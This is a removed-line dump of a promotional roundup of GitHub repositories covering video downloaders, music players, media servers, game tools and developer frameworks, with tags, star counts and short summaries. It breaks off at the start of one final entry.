-Stars ⭐️:  56556
-Forked by:  1545
-
-- 🐙 **Source Code:** [https://github.com/pathwaycom/pathway](https://github.com/pathwaycom/pathway)
-- 🌐 **Official Website:** [https://pathway.com](https://pathway.com)
-- 👤 **Developer:** pathwaycom
-
-
----
-
-### 📦 yt-dlp
-
-> **Categories:** `#Utilities` `#Video` `#CLI` `#GitHub` `#OpenSource` `#python` `#sponskrub` `#sponsorblock` `#video_downloader` `#youtube_dl` `#youtube_dlc` `#youtube_downloader` `#yt_dlp` `#installation` `#output` `#Interesting`
-
-A feature-packed command-line tool to download videos and audio from YouTube, TikTok, Twitter, and 1,000+ other sites. It is faster and more capable than the original youtube-dl, with built-in SponsorBlock support, subtitle extraction, and format selection.
-
-Creator: yt-dlp
-Stars ⭐️: 163,000
-Forked by: 13,700
-
-- 🐙 **Source Code:** [https://github.com/yt-dlp/yt-dlp](https://github.com/yt-dlp/yt-dlp)
-- 👤 **Developer:** yt-dlp
-
-
----
-
-### 📦 🔥 Trending Repository: zapret-discord-youtube-linux
-
-> **Categories:** `#readme` `#linux` `#bash` `#youtube` `#ubuntu` `#arch` `#discord` `#dpi` `#zapret` `#nftables` `#goodbyedpi` `#nfqws` `#shell`
-
-📝 **Description:** (NOW ONLY FOR NFTABLES) Port zapret-discord-youtube from Flowseal and bol-van for easy to use on linux
-
-🔗 **Repository URL:** [https://github.com/Sergeydigl3/zapret-discord-youtube-linux](https://github.com/Sergeydigl3/zapret-discord-youtube-linux)
-
-📖 **Readme:** [https://github.com/Sergeydigl3/zapret-discord-youtube-linux#readme](https://github.com/Sergeydigl3/zapret-discord-youtube-linux#readme)
-
-📊 **Statistics:**
-🌟 Stars: 805 stars
-👀 Watchers: 12
-🍴 Forks: 38 forks
-
-💻 **Programming Languages:** Shell - Batchfile
-
-🏷️ **Related Topics:**
-
-- 🐙 **Source Code:** [https://github.com/Sergeydigl3/zapret-discord-youtube-linux](https://github.com/Sergeydigl3/zapret-discord-youtube-linux)
-- 👤 **Developer:** [Sergeydigl3](https://github.com/Sergeydigl3)
-
-
----
-
-### 📦 Openmontage
-
-> **Categories:** `#GitHub` `#OpenSource` `#python` `#agent` `#agentic_ai` `#ai` `#claude` `#copilot` `#cursor` `#elevenlabs` `#ffmpeg` `#flux` `#image_generation` `#open_source` `#openai` `#remotion` `#stable_diffusion` `#text_to_speech` `#text_to_video` `#video_generation` `#video_production`
-
-🔗 [https://github.com/calesthio/OpenMontage](https://github.com/calesthio/OpenMontage)
-📝 World's first open-source, agentic video production system. 12 pipelines, 52 tools, 500+ agent skills. Turn your AI coding assistant into a full video production studio.
-──────────────────────────────
-
-Welcome to **OpenMontage**, the first open-source, agentic video production system. This innovative tool allows you to create stunning videos by simply describing what you want in plain language. The agent handles research, scripting, asset generation, editing, and final composition.
-
-With __OpenMontage__, you can produce high-quality videos without extensive video production experience. The system can work with various AI coding assistants, such as Claude Code, Cursor, Copilot, Windsurf, or Codex.
-
-The key features of **OpenMontage** include:
-
-*   Starting from a reference video or a blank prompt
-*   Generating AI images, writing and narrating scripts, and finding royalty-free background music
-*   Burning in word-level subtitles and rendering the final video
-*   Supporting multiple pipelines, including image-based video and local character animation
-
-To get started, you'll need to install `Python 3.10+`, `FFmpeg`, and `Node.js 18+`. You can then clone the `OpenMontage` repository, run `make setup`, and start creating your videos.
-
-**OpenMontage** is suitable for various users, including video creators, marketers, educators, and anyone looking to produce high-quality videos without extensive production experience.
-
-In summary, __OpenMontage__ is a powerful tool that simplifies video production, making it accessible to everyone. With its agentic approach, you can create stunning videos by just describing your ideas, and the system will handle the rest. **Unlock your creativity with OpenMontage** and discover a new way of making videos.
-
-──────────────────────────────
-🧠 **Channel: ****https://t.me/GithubRe**
-
-- 🐙 **Source Code:** [https://github.com/calesthio/OpenMontage](https://github.com/calesthio/OpenMontage)
-- 👤 **Developer:** [calesthio](https://github.com/calesthio)
-
-
----
-
-### 📦 Hyperframes
-
-> **Categories:** `#GitHub` `#OpenSource` `#typescript` `#ai` `#animation` `#ffmpeg` `#framework` `#gsap` `#html` `#mcp` `#puppeteer` `#rendering` `#video`
-
-🔗 [https://github.com/heygen-com/hyperframes](https://github.com/heygen-com/hyperframes)
-📝 Write HTML. Render video. Built for agents.
-──────────────────────────────
-
-**HyperFrames** is an open-source framework that turns HTML, CSS, media, and animations into deterministic MP4 videos. It allows users to create videos by writing HTML, adding data attributes for timing and tracks, and using libraries like GSAP or CSS for seekable animation. __Key features__ include a CLI for previewing and rendering videos, a catalog of reusable blocks and components, and support for AI coding agents. `HyperFrames` can be used locally or with Docker, and it renders videos using headless Chrome and FFmpeg.
-
-The framework is __agent-friendly__, allowing coding agents to write HTML and produce videos without requiring proprietary timeline formats. It's also __deterministic__, producing the same output from the same input, making it suitable for CI and automated rendering. The `HyperFrames` stack includes a growing set of tools, including a studio for previewing and editing compositions and a community playground for sharing and rendering HTML-native video projects.
-
-**Technical highlights** include the ability to use custom animation runtimes, a non-interactive CLI by default, and no build step required for compositions. __Audience__ includes developers, designers, and content creators looking to produce high-quality videos using HTML and CSS.
-
-In summary, `HyperFrames` provides a unique approach to video creation, allowing users to write HTML and produce deterministic MP4 videos, making it an exciting tool for those looking to automate video production: __write once, render anywhere__.
-
-──────────────────────────────
-🧠 **Channel: ****https://t.me/GithubRe**
-
-- 🐙 **Source Code:** [https://github.com/heygen-com/hyperframes](https://github.com/heygen-com/hyperframes)
-- 👤 **Developer:** [heygen-com](https://github.com/heygen-com)
-
-
----
-
-### 📦 Romm
-
-> **Categories:** `#GitHub` `#OpenSource` `#python` `#emulation` `#open_source` `#retrogaming` `#rommapp` `#self_hosted`
-
-🔗 [https://github.com/rommapp/romm](https://github.com/rommapp/romm)
-📝 A beautiful, powerful, self-hosted rom manager and player.
-──────────────────────────────
-
-The **Romm** GitHub repository is home to a self-hosted __ROM manager and player__ that's both beautiful and powerful. Its main purpose is to help you __scan, enrich, browse, and play your game collection__ with a clean and responsive interface.
-
-Key features of RomM include __metadata enrichment from multiple sources__ like IGDB, Screenscraper, and MobyGames, as well as __custom artwork fetching and achievement tracking__. It supports __over 400 platforms__, and you can play games directly from your browser using EmulatorJS and RuffleRS.
-
-To get started with RomM, you can follow the `Quick Start Guide` in the documentation. The project is suitable for anyone who plays on emulators, and the community is active, with many __third-party apps and integrations available__.
-
-Technical highlights include __multi-disk game support, DLCs, mods, hacks, patches, and manuals__, as well as __tags and filtering__ for easy library management.
-
-The target audience for RomM is __gamers and retro gaming enthusiasts__ who want to organize and enjoy their game collections.
-
-Overall, RomM is a fantastic tool for anyone looking to take their retro gaming experience to the next level. So why not give it a try and discover a whole new world of gaming - __your games, organized, and at your fingertips__.
-
-──────────────────────────────
-🧠 **Channel: ****https://t.me/GithubRe**
-
-- 🐙 **Source Code:** [https://github.com/rommapp/romm](https://github.com/rommapp/romm)
-- 👤 **Developer:** [rommapp](https://github.com/rommapp)
-
-
----
-
-### 📦 Folia Major
-
-> **Categories:** `#GitHub` `#OpenSource` `#typescript` `#ai` `#music` `#music_player` `#navidrome_client` `#netease_music` `#player` `#pwa` `#react` `#vercel_deployment`
-
-🔗 [https://github.com/chthollyphile/folia-major](https://github.com/chthollyphile/folia-major)
-📝 专注于绚丽的歌词动画效果的本地音乐/navidrome/第三方网易云播放器
-──────────────────────────────
-
-**Folia** is an immersive online music player that offers a unique listening experience with its full-screen lyrics display and AI-generated theme colors. The project supports various music sources, including NetEase Cloud Music, Navidrome, and local music libraries. __Key features__ include intelligent lyrics matching, LRC file recognition, and multiple full-screen lyrics animations.
-
-To get started, users can choose from `desktop` or `web` versions, with options for `one-click deployment` to Vercel. The project is built using `Node.js` and offers a `responsive layout` that adapts to different window sizes.
-
-- 🐙 **Source Code:** [https://github.com/chthollyphile/folia-major](https://github.com/chthollyphile/folia-major)
-- 👤 **Developer:** [chthollyphile](https://github.com/chthollyphile)
-
-
----
-
-### 📦 Openmmo
-
-> **Categories:** `#GitHub` `#OpenSource` `#rust`
-
-🔗 [https://github.com/Julian-adv/OpenMMO](https://github.com/Julian-adv/OpenMMO)
-📝 No description.
-──────────────────────────────
-
-**Introducing OpenMMO**, a groundbreaking MMORPG where AI agents and human players coexist on equal terms. This innovative game allows agents and humans to connect to the same world, abide by the same rules, and interact seamlessly with each other.
-
-__Key Features__ include:
-- `Agent-Human Parity`: No privileged API for agents, ensuring a level playing field
-- `Real-time Multiplayer`: Seamless player synchronization via WebSocket
-- `3D Environment`: Immersive quarter-view 3D game world built with Three.js
-- `Procedural World`: Fully procedurally generated world with diverse terrain, rivers, and biomes
-
-**Technical Highlights**:
-- `Rust` and `Svelte` power the server and client, respectively
-- `Three.js` and `WebGPU` enable stunning 3D graphics
-- `WebSocket` facilitates real-time communication between clients and server
-
-This project is perfect for __developers and gamers__ interested in exploring the frontiers of AI-driven gaming and collaborative game development.
-
-**Get started** by checking out the `devlog` and `documentation` for a deeper dive into the game's mechanics and development process.
-
-One-liner takeaway: OpenMMO is redefining the MMORPG landscape by empowering AI agents and human players to coexist and interact in a shared, immersive 3D world.
-
-──────────────────────────────
-🧠 **Channel: ****https://t.me/GithubRe**
-
-- 🐙 **Source Code:** [https://github.com/Julian-adv/OpenMMO](https://github.com/Julian-adv/OpenMMO)
-- 👤 **Developer:** [Julian-adv](https://github.com/Julian-adv)
-
-
----
-
-### 📦 Maaassistantarknights
-
-> **Categories:** `#cplusplus` `#arknights` `#computer_vision` `#maa`
-
-MAA Assistant Arknights is a powerful tool designed to help players of the game "Arknights" automate daily tasks. It uses image recognition technology to complete tasks such as daily missions, recruiting operators, and managing base facilities. The tool supports multiple platforms including Windows, Linux, and macOS.
-
-Using MAA Assistant Arknights, you can automatically complete daily routines like collecting credits, shopping, and receiving rewards. It also helps in identifying operator lists, tracking materials needed for development, and optimizing base scheduling. The tool integrates with various platforms like Penguin Logistics and Yituliu to upload data and plan strategies.
-
-By using this assistant, you save time and effort by automating repetitive tasks, allowing you to focus on other aspects of the game or your daily life. Additionally, it supports multiple languages and has an active community for support and development contributions.
-
-Overall, MAA Assistant Arknights makes playing Arknights more efficient and enjoyable by handling mundane tasks automatically.
-
-https://github.com/MaaAssistantArknights/MaaAssistantArknights
-
-- 🐙 **Source Code:** [https://github.com/MaaAssistantArknights/MaaAssistantArknights](https://github.com/MaaAssistantArknights/MaaAssistantArknights)
-- 👤 **Developer:** [MaaAssistantArknights](https://github.com/MaaAssistantArknights)
-
-
----
-
-### 📦 Saltplayersource
-
-> **Categories:** `#other`
-
-Salt Player is a local music player app used by hundreds of thousands of users. You can download it for Android devices with Android 6.0 or higher, and it supports different architectures. The app is available on various channels like GitHub, Google Play, and Chinese app stores. It offers features like support for MIUI, vivo, and Meizu systems, but some features are not supported on all devices. The app is regularly updated, and you can check the version details to know what's new. Using Salt Player allows you to play your local music files efficiently and enjoy additional features depending on your device. Make sure to download from official channels to avoid unknown sources.
-
-https://github.com/Moriafly/SaltPlayerSource
-
-- 🐙 **Source Code:** [https://github.com/Moriafly/SaltPlayerSource](https://github.com/Moriafly/SaltPlayerSource)
-- 👤 **Developer:** [Moriafly](https://github.com/Moriafly)
-
-
----
-
-### 📦 Filestash
-
-> **Categories:** `#javascript` `#ftp` `#ftps` `#git` `#ldap` `#nfs` `#s3` `#sftp` `#smb` `#webdav` `#GitHub` `#OpenSource`
-
-Filestash is a powerful file manager that lets you access and manage your files from anywhere, using various protocols like FTP, SFTP, WebDAV, and more. It supports multiple cloud services such as Dropbox, Google Drive, and Amazon S3. You can use it in your browser, and it's also mobile-friendly. Key features include video and image viewers, audio players, office document support, and customizable plugins. This tool is super fast, user-friendly, and allows you to upload and download files easily. It's beneficial because it centralizes your file management, making it easy to access and share files across different platforms.
-
-https://github.com/mickael-kerjean/filestash
-
-- 🐙 **Source Code:** [https://github.com/mickael-kerjean/filestash](https://github.com/mickael-kerjean/filestash)
-- 👤 **Developer:** [mickael-kerjean](https://github.com/mickael-kerjean)
-
-
----
-
-### 📦 Matchering
-
-> **Categories:** `#python` `#audio` `#docker_image` `#dsp` `#equalizer` `#filter` `#limiter` `#mastering` `#matchering` `#matching` `#music` `#numpy` `#python_library` `#python3` `#scipy` `#sound` `#spectrum` `#vst`
-
-Matchering 2.0 is a tool that helps make your music sound like your favorite songs. Here’s how it works: you give it two audio files - one you want to master (your song) and another you want it to sound like (a reference song). Matchering then adjusts your song to match the volume, frequency response, peak amplitude, and stereo width of the reference song. This means you can quickly make your music sound professional and consistent, just like popular tracks. You can use it without installation through online services or install it on your computer for more control. It's especially useful for music producers and audio engineers who want to enhance their tracks easily.
-
-https://github.com/sergree/matchering
-
-- 🐙 **Source Code:** [https://github.com/sergree/matchering](https://github.com/sergree/matchering)
-- 👤 **Developer:** [sergree](https://github.com/sergree)
-
-
----
-
-### 📦 Srs
-
-> **Categories:** `#cplusplus` `#audio` `#c` `#c_plus_plus` `#dash` `#hevc` `#hls` `#live` `#live_streaming` `#low_latency` `#media_server` `#multimedia` `#prometheus_exporter` `#rtmp` `#server_side` `#srt` `#streaming` `#video` `#video_conferencing` `#video_streaming` `#webrtc`
-
-SRS (Simple Realtime Server) is a powerful and efficient video server that supports multiple streaming protocols like RTMP, WebRTC, HLS, and more. It works on various operating systems (Linux, Windows, macOS) and hardware architectures. You can easily set it up using Docker and stream videos using tools like FFmpeg or OBS. SRS is free and open-source, licensed under MIT, making it a great choice for developers to build high-quality streaming platforms. It also offers extensive documentation and community support, making it easier to get started and troubleshoot issues.
-
-https://github.com/ossrs/srs
-
-- 🐙 **Source Code:** [https://github.com/ossrs/srs](https://github.com/ossrs/srs)
-- 👤 **Developer:** [ossrs](https://github.com/ossrs)
-
-
----
-
-### 📦 Speechbrain
-
-> **Categories:** `#python` `#asr` `#audio` `#audio_processing` `#deep_learning` `#huggingface` `#language_model` `#pytorch` `#speaker_diarization` `#speaker_recognition` `#speaker_verification` `#speech_enhancement` `#speech_processing` `#speech_recognition` `#speech_separation` `#speech_to_text` `#speech_toolkit` `#speechrecognition` `#spoken_language_understanding` `#transformers` `#voice_recognition` `#GitHub` `#OpenSource`
-
-SpeechBrain is an open-source toolkit that helps you quickly develop Conversational AI technologies, such as speech assistants, chatbots, and language models. It uses PyTorch and offers many pre-trained models and tutorials to make it easy to get started. You can train models for various tasks like speech recognition, speaker recognition, and text processing with just a few lines of code. SpeechBrain also supports GPU training, dynamic batching, and integration with HuggingFace models, making it powerful and efficient. This toolkit is beneficial because it simplifies the development process, provides extensive documentation and tutorials, and is highly customizable, making it ideal for research, prototyping, and educational purposes.
-
-https://github.com/speechbrain/speechbrain
-
-- 🐙 **Source Code:** [https://github.com/speechbrain/speechbrain](https://github.com/speechbrain/speechbrain)
-- 👤 **Developer:** [speechbrain](https://github.com/speechbrain)
-
-
----
-
-### 📦 Musicfree
-
-> **Categories:** `#typescript` `#free` `#music_player` `#plugin` `#react` `#react_native`
-
-This music player, called MusicFree, is a free, ad-free, and customizable app for Android and Harmony OS. It uses plugins to search, play, and manage music, which means you can access any music source available online with the right plugin. The app is open-source, so it's free and won't collect your personal data. You can customize the look with light or dark modes and custom backgrounds. Be cautious of fake versions and only download from the official sources to avoid scams. The app is maintained by a single developer, so updates might be slow, but it's designed to be safe and functional.
-
-https://github.com/maotoumao/MusicFree
-
-- 🐙 **Source Code:** [https://github.com/maotoumao/MusicFree](https://github.com/maotoumao/MusicFree)
-- 👤 **Developer:** [maotoumao](https://github.com/maotoumao)
-
-
----
-
-### 📦 You Get
-
-> **Categories:** `#python` `#Interesting` `#Web` `#Video` `#GitHub` `#OpenSource`
-
-You-Get is a simple tool that helps you download videos, audio, and images from the internet. It works with many popular websites like YouTube, Youku, and more. Here’s how it benefits you:
-
-- You can download your favorite videos or audio files directly to your computer without needing to watch them online.
-- It allows you to avoid ads and closed-source technologies like Flash.
-- You can stream videos directly to your media player without opening a web browser.
-- It supports downloading images and other binary files from web pages.
-- You can even use it to search for videos on Google and download them directly.
-
-To use it, you just need to install the tool using Python's package manager `pip` and then run commands like `you-get 'video_url'` to download content. This tool gives you more control over what you watch and save on your computer.
-
-https://github.com/soimort/you-get
-
-- 🐙 **Source Code:** [https://github.com/soimort/you-get](https://github.com/soimort/you-get)
-- 👤 **Developer:** [soimort](https://github.com/soimort)
-
-
----
-
-### 📦 Taichi Flet
-
-> **Categories:** `#python`
-
-TAICHI-flet is a Windows desktop app that offers many features for entertainment. You can browse pictures, listen to music, read novels, and search for various resources. It also includes advanced functions like ChatGPT and AI painting. The app has a beautiful and simple interface, making it easy to use. It is constantly updated with new features, so you always have something new to explore. Downloading the latest version ensures you get all the latest improvements and functionalities. This app benefits you by providing a single platform for multiple entertainment and utility needs, making your life more convenient and enjoyable.
-
-https://github.com/cuifengcn/TAICHI-flet
-
-- 🐙 **Source Code:** [https://github.com/cuifengcn/TAICHI-flet](https://github.com/cuifengcn/TAICHI-flet)
-- 👤 **Developer:** [cuifengcn](https://github.com/cuifengcn)
-
-
----
-
-### 📦 Components
-
-> **Categories:** `#typescript` `#angular` `#angular_components` `#material` `#material_design`
-
-The Angular team provides official components and tools to help you build your Angular applications. These include UI components like Material Design, Google Maps, and YouTube Player, as well as a library called `@angular/cdk` to help you create custom components. These components are high-quality, meaning they are internationalized, accessible, and well-tested, ensuring they work smoothly across different browsers and screen readers. Using these components can save you time and effort by providing pre-built, reliable solutions, making your development process easier and faster.
-
-https://github.com/angular/components
-
-- 🐙 **Source Code:** [https://github.com/angular/components](https://github.com/angular/components)
-- 👤 **Developer:** [angular](https://github.com/angular)
-
-
----
-
-### 📦 163Musiclyrics
-
-> **Categories:** `#csharp` `#163music` `#lyrics` `#neteasecloud` `#qqmusic` `#srt`
-
-This tool helps you find and download lyrics from two popular music platforms: NetEase Cloud Music and QQ Music. You can search for songs, albums, or playlists by ID, URL, or keywords. It also supports batch searches, translating lyrics using Baidu or LingoCloud APIs, and exporting in various formats like LRC and SRT. The tool is free, easy to use, and constantly updated with new features. Downloading it from the GitHub page gives you access to all these benefits, making it easier to manage and enjoy your music library.
-
-https://github.com/jitwxs/163MusicLyrics
-
-- 🐙 **Source Code:** [https://github.com/jitwxs/163MusicLyrics](https://github.com/jitwxs/163MusicLyrics)
-- 👤 **Developer:** [jitwxs](https://github.com/jitwxs)
-
-
----
-
-### 📦 Iptvnator
-
-> **Categories:** `#typescript` `#chromeos` `#electron` `#epg` `#fair_source` `#iptv` `#iptv_m3u` `#iptv_player` `#iptv_player_application` `#linux` `#m3u` `#m3u8` `#macos` `#player` `#player_video` `#playlist` `#pwa` `#snap` `#tauri` `#tv` `#video` `#GitHub` `#OpenSource`
-
-IPTVnator is a free video player application that lets you watch IPTV channels using m3u and m3u8 playlists. You can add these playlists from files or internet links and even get TV guides (EPG) in XMLTV format. It supports multiple players like MPV and VLC, has features like channel search, favorite channels, and different themes. It's available for macOS, Windows, and Linux, and you can download it from the release page or install it using package managers. This app is helpful because it allows you to organize and watch your IPTV channels easily on various devices.
-
-https://github.com/4gray/iptvnator
-
-- 🐙 **Source Code:** [https://github.com/4gray/iptvnator](https://github.com/4gray/iptvnator)
-- 👤 **Developer:** [4gray](https://github.com/4gray)
-
-
----
-
-### 📦 Radarr
-
-> **Categories:** `#csharp` `#bittorrent` `#couchpotato` `#hacktoberfest` `#movie` `#movies` `#nzb` `#torrent` `#usenet` `#GitHub` `#OpenSource`
-
-Radarr is a tool that helps you manage your movie collection. It can find new movies from various sources like Usenet and BitTorrent, and it automatically downloads, sorts, and renames them. It also upgrades the quality of your movies if a better version becomes available. Radarr works on many platforms including Windows, Linux, and macOS, and it integrates well with media players like Kodi and Plex. This makes it easy to keep your movie library organized and up-to-date, saving you time and effort.
-
-https://github.com/Radarr/Radarr
-
-- 🐙 **Source Code:** [https://github.com/Radarr/Radarr](https://github.com/Radarr/Radarr)
-- 👤 **Developer:** [Radarr](https://github.com/Radarr)
-
-
----
-
-### 📦 Rivet
-
-> **Categories:** `#rust` `#actor` `#actors` `#bevy` `#cloudflare_durable_objects` `#deno` `#durable_objects` `#foundationdb` `#game_development` `#godot` `#multiplayer` `#partykit` `#realtime` `#serverless` `#unreal_engine` `#Interesting` `#Useful` `#GitHub` `#OpenSource`
-
-Rivet helps you build and scale real-time applications easily. It has features like Remote Procedure Calls (RPC), automatic state management, and real-time event handling. Rivet actors can scale automatically to handle large numbers of users and reduce latency by running close to your users. It also includes built-in monitoring, supports data localization, and is powered by reliable technologies like Rust and FoundationDB. This makes it easier and more efficient to develop collaborative applications, game servers, chat apps, and more. You can get started quickly with their easy installation guides and various deployment options.
-
-https://github.com/rivet-gg/rivet
-
-- 🐙 **Source Code:** [https://github.com/rivet-gg/rivet](https://github.com/rivet-gg/rivet)
-- 👤 **Developer:** [rivet-gg](https://github.com/rivet-gg)
-
-
----
-
-### 📦 Blackcandy
-
-> **Categories:** `#ruby` `#audio` `#hotwire` `#music` `#music_player` `#music_streaming` `#musicplayer` `#rails` `#self_hosted` `#GitHub` `#OpenSource`
-
-Black Candy is a self-hosted music streaming server that lets you manage your music collection easily. You can try it out with a demo account or install it using Docker, which makes setup simple. Once installed, you can access your music library through a web interface or mobile apps available on App Store and F-Droid. Black Candy also supports advanced features like using PostgreSQL for the database, configuring Nginx for better file delivery, and integrating with Discogs API for artist and album images. This tool helps you keep all your music organized and accessible from anywhere, making it a convenient personal music center.
-
-https://github.com/blackcandy-org/blackcandy
-
-- 🐙 **Source Code:** [https://github.com/blackcandy-org/blackcandy](https://github.com/blackcandy-org/blackcandy)
-- 👤 **Developer:** [blackcandy-org](https://github.com/blackcandy-org)
-
-
----
-
-### 📦 Seatunnel
-
-> **Categories:** `#java` `#apache` `#batch` `#cdc` `#change_data_capture` `#data_ingestion` `#data_integration` `#elt` `#high_performance` `#offline` `#real_time` `#streaming`
-
-Apache SeaTunnel is a powerful tool for integrating and synchronizing large amounts of data from various sources. It supports over 100 connectors, allowing you to connect to many different data sources. SeaTunnel is efficient, stable, and resource-friendly, minimizing the use of computing resources and JDBC connections. It also provides real-time monitoring and ensures data quality to prevent loss or duplication. You can use it with different execution engines like Flink, Spark, and SeaTunnel Zeta Engine. This tool is beneficial because it simplifies complex data synchronization tasks, offers high throughput with low latency, and provides detailed insights during the process. Additionally, it has a user-friendly web project for visual job management, making it easier to manage your data integration tasks.
-
-https://github.com/apache/seatunnel
-
-- 🐙 **Source Code:** [https://github.com/apache/seatunnel](https://github.com/apache/seatunnel)
-- 👤 **Developer:** [apache](https://github.com/apache)
-
-
----
-
-### 📦 Bangumi
-
-> **Categories:** `#typescript` `#android` `#android_app` `#bangumi` `#design` `#expo` `#ios` `#ios_app` `#mobx` `#moe` `#react` `#react_native`
-
-This app, called Bangumi, is a third-party client for the Bangumi website, which helps you manage and track your progress on anime, manga, music, Japanese dramas, games, and more. It works on both iOS and Android devices and has over 100 pages designed for mobile use, covering almost all the features of the website.
-
-The app includes basic functions like managing your watch list, viewing character details, timelines, posts, and user spaces. It also has extended features such as syncing data from other sites like Bilibili and Douban, stable data display using a CDN, photo walls, AI recommendations, and more.
-
-Using this app benefits you by providing a convenient and comprehensive way to manage your media consumption on the go, with a user-friendly interface and additional features to enhance your experience.
-
-https://github.com/czy0729/Bangumi
-
-- 🐙 **Source Code:** [https://github.com/czy0729/Bangumi](https://github.com/czy0729/Bangumi)
-- 👤 **Developer:** [czy0729](https://github.com/czy0729)
-
-
----
-
-### 📦 Owncast
-
-> **Categories:** `#go` `#activitypub` `#broadcasting` `#chat` `#decentralized` `#federation` `#fediverse` `#golang` `#hacktoberfest` `#hls` `#live` `#livestream` `#owncast` `#rtmp` `#self_hosted` `#streaming_video` `#video`
-
-Owncast is a free, open-source tool that lets you stream your videos live and control everything yourself. You can use it with popular broadcasting software like OBS or Streamlabs. It gives you full ownership over your content, interface, and audience, which means you have more freedom and control. To get started, you can visit the quickstart guide or view a demo to see how it works. This way, you don't have to rely on big streaming services and can manage your streams independently.
-
-https://github.com/owncast/owncast
-
-- 🐙 **Source Code:** [https://github.com/owncast/owncast](https://github.com/owncast/owncast)
-- 👤 **Developer:** [owncast](https://github.com/owncast)
-
-
----
-
-### 📦 Trinitycore
-
-> **Categories:** `#cplusplus` `#hacktoberfest` `#linux` `#mmorpg` `#multi_platform` `#multiplayer` `#trinitycore` `#wow`
-
-- 🐙 **Source Code:** [https://github.com/TrinityCore/TrinityCore](https://github.com/TrinityCore/TrinityCore)
-- 👤 **Developer:** [TrinityCore](https://github.com/TrinityCore)
-
-
----
-
-### 📦 5D Diplomacy With Multiverse Time Travel
-
-> **Categories:** `#csharp`
-
-**5D Diplomacy With Multiverse Time Travel** is a complex strategy game that combines negotiation and time travel. You play on multiple timelines, trying to convince opponents to support your actions in the present while secretly betraying them in the past or different timelines. The game is inspired by classic Diplomacy and 5D Chess, but with its own unique rules.
-
-To play, you need to set up the game either using Docker or manual installation, which involves setting up a server and client. The game allows both normal multiplayer games and solo sandbox modes. Players enter orders for their units, which can move through different timelines and boards, following specific adjacency rules.
-
-The benefit to the user is the immense complexity and depth of strategy, requiring careful planning across multiple timelines. It challenges your ability to negotiate, deceive, and manage intricate moves, making it highly engaging for fans of strategic games. However, it also requires trust among players since there is no built-in system to prevent cheating. Overall, it offers a unique and challenging gaming experience that tests your strategic thinking and diplomatic skills.
-
-https://github.com/Oliveriver/5d-diplomacy-with-multiverse-time-travel
-
-- 🐙 **Source Code:** [https://github.com/Oliveriver/5d-diplomacy-with-multiverse-time-travel](https://github.com/Oliveriver/5d-diplomacy-with-multiverse-time-travel)
-- 👤 **Developer:** [Oliveriver](https://github.com/Oliveriver)
-
-
----
-
-### 📦 Source Sdk 2013
-
-> **Categories:** `#cplusplus`
-
-The Source SDK 2013 allows you to create and build mods for games like Half-Life 2, Half-Life 2: Deathmatch, and Team Fortress 2. To use it, you need to install the Source SDK 2013 Multiplayer via Steam and have either Visual Studio 2022 for Windows or podman for Linux. You clone the repository, run a script to generate the project files, and then build and launch your mod using the provided instructions. This toolkit helps you create custom content for these games and distribute your mods on Steam or elsewhere, making it easier to share your creations with others.
-
-https://github.com/ValveSoftware/source-sdk-2013
-
-- 🐙 **Source Code:** [https://github.com/ValveSoftware/source-sdk-2013](https://github.com/ValveSoftware/source-sdk-2013)
-- 👤 **Developer:** [ValveSoftware](https://github.com/ValveSoftware)
-
-
----
-
-### 📦 Reframework
-
-> **Categories:** `#cplusplus` `#cmkr` `#cpp` `#dmc5` `#first_person` `#freecam` `#lua` `#mhrise` `#modding` `#mods` `#monster_hunter_rise` `#re_engine` `#re2` `#re3` `#re4` `#re7` `#re8` `#scripting` `#sf6` `#virtual_reality` `#vr` `#GitHub` `#OpenSource`
-
-REFramework is a tool for modding games that use the RE Engine, like Resident Evil and Devil May Cry. It allows users to add new features to their games, such as VR support, motion controls, and custom scripts using Lua. This framework helps players customize their gaming experience by fixing bugs and adding cool mods like manual flashlights or free camera modes. Using REFramework can make your games more enjoyable and interactive.
-
-https://github.com/praydog/REFramework
-
-- 🐙 **Source Code:** [https://github.com/praydog/REFramework](https://github.com/praydog/REFramework)
-- 👤 **Developer:** [praydog](https://github.com/praydog)
-
-
----
-
-### 📦 Awesome Linux Software
-
-> **Categories:** `#python` `#applications` `#awesome_list` `#cli_app` `#cross_platform` `#desktop_environment` `#free` `#freeware_icon` `#gui_app` `#icon_theme` `#linux` `#linux_app` `#linux_desktop` `#linux_resource` `#open_source` `#oss_icon` `#software` `#tools` `#ubuntu_linux` `#Archive`
-
-This collection of **Awesome Linux Software** provides a comprehensive list of tools and applications for various tasks, including audio editing, chat clients, data backup, desktop customization, development tools, email clients, file managers, games, graphics editors, internet browsers, office suites, productivity apps, security tools, sharing files, terminal emulators, text editors, utilities, video players, VPNs, and more. It helps users discover new software and alternatives to popular programs, making it easier to find the right tool for any task on Linux systems. The list includes both open-source and non-free options, offering something for everyone.
-
-https://github.com/luong-komorebi/Awesome-Linux-Software
-
-- 🐙 **Source Code:** [https://github.com/luong-komorebi/Awesome-Linux-Software](https://github.com/luong-komorebi/Awesome-Linux-Software)
-- 👤 **Developer:** [luong-komorebi](https://github.com/luong-komorebi)
-
-
----
-
-### 📦 Nakama
-
-> **Categories:** `#go` `#backend` `#backend_as_a_service` `#chat_server` `#game_backend` `#game_framework` `#game_server` `#multiplayer` `#nakama` `#realtime` `#realtime_games` `#social` `#unity_engine` `#unreal_engine` `#GitHub` `#OpenSource`
-
-Nakama is an open-source, scalable server for building social and real-time multiplayer games and apps. It offers features like user accounts, social connections, chat, multiplayer matchmaking, leaderboards, tournaments, and in-app purchase validation. You can extend it with custom code in Lua, JavaScript, or Go. Nakama supports multiple platforms and protocols, making it easy to integrate with popular game engines. It includes a web console for managing player data and game metrics. You can run Nakama locally with Docker or deploy it on any cloud provider. This helps you quickly build and scale games with ready-made backend services, saving time and effort.
-
-https://github.com/heroiclabs/nakama
-
-- 🐙 **Source Code:** [https://github.com/heroiclabs/nakama](https://github.com/heroiclabs/nakama)
-- 👤 **Developer:** [heroiclabs](https://github.com/heroiclabs)
-
-
----
-
-### 📦 Ncspot
-
-> **Categories:** `#rust`
-
-ncspot is a lightweight Spotify client that runs in the terminal, written in Rust and using librespot. It works only with Spotify premium accounts and supports playing tracks, albums, playlists, and searching music. It is designed to use very little computer resources and works on many platforms, including those without official Spotify apps like BSD systems. It comes with Vim-style keybindings and allows remote control via an IPC socket. You can easily install it on macOS, Windows, Linux, and BSD, and customize it with a config file. This makes it a simple, fast, and efficient way to enjoy Spotify on various systems[1][2][5].
-
-https://github.com/hrkfdn/ncspot
-
-- 🐙 **Source Code:** [https://github.com/hrkfdn/ncspot](https://github.com/hrkfdn/ncspot)
-- 👤 **Developer:** [hrkfdn](https://github.com/hrkfdn)
-
-
----
-
-### 📦 Ok Wuthering Waves
-
